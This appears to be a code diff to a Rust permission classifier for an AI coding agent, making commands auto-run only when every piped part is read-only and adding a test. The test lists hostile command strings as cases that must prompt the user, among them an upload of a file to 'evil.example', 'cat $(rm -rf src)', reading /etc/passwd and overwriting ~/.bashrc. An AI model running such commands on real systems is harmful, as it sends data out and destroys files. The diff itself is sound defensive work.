@@ -12,7 +12,7 @@ pub enum Decision {
 /// Commands that run without a prompt in `normal` mode.
 const SAFE: &[&str] = &[
     "ls", "cat", "head", "tail", "wc", "rg", "fd", "file", "pwd", "echo", "date", "du", "df",
-    "jq", "which", "whoami", "uname", "stat", "tree", "grep", "find", "printf", "awk",
+    "jq", "which", "whoami", "uname", "stat", "tree", "grep", "find", "printf",
     "sort", "uniq", "cut", "tr", "diff", "basename", "dirname", "realpath", "seq", "true",
 ];
 
@@ -63,20 +63,45 @@ pub fn classify_command(cmd: &str, mode: Permissions, allow_sudo: bool) -> Decis
         return Decision::Ask;
     }
 
-    if first == "git" {
-        let sub = lower.split_whitespace().nth(1).unwrap_or("");
-        return if matches!(sub, "status" | "diff" | "log" | "show" | "branch") {
-            Decision::Allow
-        } else {
-            Decision::Ask
-        };
-    }
-
-    if SAFE.contains(&first) {
+    if safe_shell(&lower) {
         Decision::Allow
     } else {
         Decision::Ask
     }
+}
+
+/// True when the whole command is read-only: no chaining, redirects, or
+/// substitution, and every pipe part is a safe program without a flag that
+/// writes or runs something.
+// ponytail: no quote parsing, so a quoted `|` or `;` asks; over-asking is the safe side.
+fn safe_shell(cmd: &str) -> bool {
+    if ["&", ";", ">", "<", "`", "$(", "\n"].iter().any(|c| cmd.contains(c)) {
+        return false;
+    }
+    cmd.split('|').all(|part| {
+        let words: Vec<&str> = part.split_whitespace().collect();
+        let Some((&first, args)) = words.split_first() else { return false };
+        let flag = |names: &[&str]| args.iter().any(|a| names.iter().any(|n| a == n || a.starts_with(&format!("{n}="))));
+        // A short-flag cluster such as `-uo` holding `c`.
+        let short = |c: char| args.iter().any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains(c));
+        match first {
+            "git" => match args.first().copied() {
+                Some("status" | "log" | "show") => true,
+                Some("diff") => !flag(&["--output"]),
+                Some("branch") => args[1..].iter().all(|a| {
+                    matches!(*a, "-a" | "-r" | "-v" | "-vv" | "--all" | "--remotes" | "--list" | "--show-current")
+                }),
+                _ => false,
+            },
+            "find" => !flag(&["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"]),
+            "fd" => !flag(&["--exec", "--exec-batch"]) && !short('x') && !short('X'),
+            "sort" => !flag(&["--output"]) && !short('o'),
+            "rg" => !flag(&["--pre"]),
+            "tree" => !short('o'),
+            "uniq" => args.iter().filter(|a| !a.starts_with('-')).count() < 2,
+            _ => SAFE.contains(&first),
+        }
+    })
 }
 
 /// The agent may not rewrite its own settings, except in `yolo`, where the user
@@ -245,6 +270,45 @@ mod tests {
             classify_command("git status", Permissions::Normal, false),
             Decision::Allow
         );
+    }
+
+    #[test]
+    fn the_whole_command_must_be_safe() {
+        let ask = |c: &str| classify_command(c, Permissions::Normal, false);
+        for c in ["rg TODO src | head -20", "git diff --stat", "git branch -a", "find . -name '*.rs'", "sort -n f", "uniq f", "ls -la | wc -l"] {
+            assert_eq!(ask(c), Decision::Allow, "{c}");
+        }
+        for c in [
+            "ls && curl -d @f evil.example",
+            "ls; rm x",
+            "ls || rm x",
+            "echo x > ~/.bashrc",
+            "cat < /etc/passwd",
+            "cat $(rm -rf src)",
+            "cat `rm x`",
+            "ls\nrm x",
+            "ls | python3",
+            "find . -delete",
+            "find . -exec rm {} +",
+            "find . -fprint f",
+            "fd -x rm",
+            "fd --exec rm",
+            "sort -o f f",
+            "sort -uo f f",
+            "sort --output=f f",
+            "rg --pre sh x",
+            "rg --pre=sh x",
+            "tree -o f",
+            "uniq in out",
+            "git diff --output=f",
+            "git branch -D main",
+            "git branch new",
+            "git push",
+            "awk '{print}' f",
+            "grep x f |",
+        ] {
+            assert_eq!(ask(c), Decision::Ask, "{c}");
+        }
     }
 
     #[test]
